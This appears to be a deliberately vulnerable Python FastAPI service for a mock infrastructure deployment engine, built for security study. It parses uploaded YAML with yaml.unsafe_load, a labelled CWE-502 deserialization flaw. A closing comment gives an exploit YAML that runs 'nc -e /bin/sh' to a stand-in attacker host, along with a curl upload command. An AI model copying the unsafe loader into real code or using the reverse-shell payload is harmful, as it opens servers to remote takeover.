import os
import sys
import uuid
import yaml
import sqlite3
import logging
from datetime import datetime
from fastapi import FastAPI, UploadFile, File, HTTPException, BackgroundTasks
from pydantic import BaseModel
import uvicorn

# Configure logging for the Infrastructure-as-Code (IaC) Deployment Engine
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - IaC-Engine - %(levelname)s - %(message)s'
)
logger = logging.getLogger("FastAPIDeployer")

DB_FILE = "deployments.db"

def init_deployment_db():
    """Initializes the SQLite database for tracking cloud deployments."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE cloud_deployments (
            deploy_id TEXT PRIMARY KEY,
            requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            environment TEXT NOT NULL,
            resource_count INTEGER NOT NULL,
            status TEXT NOT NULL
        )
    ''')

    mock_deployments = [
        ('dep_dev_001', datetime.now().isoformat(), 'development', 12, 'SUCCESS'),
        ('dep_stg_002', datetime.now().isoformat(), 'staging', 45, 'FAILED')
    ]
    cursor.executemany('''
        INSERT INTO cloud_deployments (deploy_id, requested_at, environment, resource_count, status)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_deployments)

    conn.commit()
    conn.close()
    logger.info("Deployment tracking database initialized.")

def record_deployment_status(deploy_id: str, env: str, count: int, status: str):
    """Persists deployment metadata to the audit database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO cloud_deployments (deploy_id, environment, resource_count, status) VALUES (?, ?, ?, ?)",
            (deploy_id, env, count, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error recording deployment {deploy_id}: {e}")

class ResourceManifest:
    """Represents a parsed IaC resource configuration."""
    def __init__(self, environment: str, resources: list):
        self.environment = environment
        self.resources = resources

def parse_iac_manifest(yaml_content: bytes, deploy_id: str) -> ResourceManifest:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: FastAPI File Upload (multipart/form-data) parsed via PyYAML
    """
    logger.info(f"[{deploy_id}] Parsing uploaded YAML infrastructure manifest.")

    try:
        # Vulnerability: The deployment engine accepts YAML files uploaded via an 
        # API endpoint and processes them using yaml.unsafe_load(). PyYAML's unsafe 
        # loader can instantiate arbitrary Python objects by declaring specific YAML 
        # tags (e.g., !!python/object/apply). If an attacker uploads a maliciously 
        # crafted YAML file, the server will execute arbitrary code during the parse phase.
        #
        # CWE-502 occurs instantly upon parsing the untrusted YAML byte stream.
        parsed_data = yaml.unsafe_load(yaml_content)

        if isinstance(parsed_data, dict) and 'environment' in parsed_data:
            resources = parsed_data.get('resources', [])
            logger.debug(f"[{deploy_id}] Manifest parsed successfully. {len(resources)} resources found.")
            return ResourceManifest(
                environment=parsed_data['environment'],
                resources=resources
            )
        else:
            logger.warning(f"[{deploy_id}] Parsed YAML does not match expected IaC schema.")
            return None

    except yaml.YAMLError as e:
        logger.error(f"[{deploy_id}] YAML Parsing Error: {e}")
        return None
    except Exception as e:
        logger.error(f"[{deploy_id}] Unexpected error deserializing YAML manifest: {e}")
        return None

app = FastAPI(
    title="IaC Deployment Engine",
    description="Internal API for declarative cloud infrastructure provisioning.",
    version="1.0.0"
)

def simulate_provisioning(deploy_id: str, manifest: ResourceManifest):
    """Simulates a long-running cloud provisioning task."""
    logger.info(f"[{deploy_id}] Provisioning {len(manifest.resources)} resources in {manifest.environment}...")
    record_deployment_status(deploy_id, manifest.environment, len(manifest.resources), "IN_PROGRESS")
    # Simulate work
    import time
    time.sleep(2)
    record_deployment_status(deploy_id, manifest.environment, len(manifest.resources), "SUCCESS")
    logger.info(f"[{deploy_id}] Deployment completed successfully.")

@app.get("/health")
def health_check():
    """Liveness probe endpoint."""
    return {"status": "FastAPI IaC Engine is operational"}

@app.post("/api/v1/deploy")
async def trigger_deployment(background_tasks: BackgroundTasks, manifest_file: UploadFile = File(...)):
    """API endpoint accepting YAML infrastructure definition files."""
    deploy_id = f"dep_{uuid.uuid4().hex[:8]}"
    
    if not manifest_file.filename.endswith(('.yaml', '.yml')):
        raise HTTPException(status_code=400, detail="Invalid file type. Only YAML is supported.")

    file_bytes = await manifest_file.read()
    if not file_bytes:
        raise HTTPException(status_code=400, detail="Uploaded file is empty.")
        
    logger.info(f"[{deploy_id}] Received deployment request via file: {manifest_file.filename}")

    # Pass the untrusted uploaded file bytes directly to the vulnerable function
    manifest = parse_iac_manifest(file_bytes, deploy_id)

    if manifest:
        background_tasks.add_task(simulate_provisioning, deploy_id, manifest)
        return {
            "message": "Deployment accepted and queued.",
            "deploy_id": deploy_id,
            "environment": manifest.environment
        }
    else:
        record_deployment_status(deploy_id, "UNKNOWN", 0, "FAILED_VALIDATION")
        raise HTTPException(status_code=422, detail="Invalid or corrupted YAML manifest structure.")

if __name__ == "__main__":
    init_deployment_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious YAML file (exploit.yaml) using PyYAML's 
    #    Python object application tags:
    #
    #    environment: production
    #    resources:
    #      - !!python/object/apply:os.system
    #        args: ['nc -e /bin/sh attacker.com 4444']
    #
    # 2. Attacker submits the file via the FastAPI file upload endpoint:
    #    curl -X POST "http://127.0.0.1:8000/api/v1/deploy" \
    #         -H "accept: application/json" \
    #         -H "Content-Type: multipart/form-data" \
    #         -F "manifest_file=@exploit.yaml"

    logger.info("Starting FastAPI Uvicorn server on http://0.0.0.0:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")
